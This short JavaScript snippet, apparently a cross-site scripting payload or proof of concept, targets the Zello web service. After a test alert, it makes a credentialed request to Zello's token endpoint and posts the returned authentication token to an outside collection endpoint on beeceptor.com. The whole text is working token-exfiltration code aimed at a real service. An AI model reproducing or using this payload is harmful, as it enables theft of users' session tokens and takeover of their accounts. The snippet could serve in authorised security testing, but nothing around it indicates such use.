alert('Hello, USER');

fetch('https://my.zello.com/user/gettoken', {
  method: 'POST',
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  fetch('https://ywhftw.free.beeceptor.com/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data),
    mode: 'no-cors'
  });
})
.catch(error => console.error('Error:', error));
